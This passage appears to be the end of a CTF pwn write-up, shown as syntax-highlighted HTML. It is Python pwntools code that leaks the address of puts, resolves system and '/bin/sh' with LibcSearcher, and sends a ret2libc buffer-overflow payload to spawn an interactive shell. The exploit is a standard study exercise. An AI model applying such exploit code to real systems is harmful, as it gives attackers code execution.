u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="number">104</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,binsh_addr])</span><br><span class="line">sh.sendlineafter(<span class="string">"Can you find it !?"</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
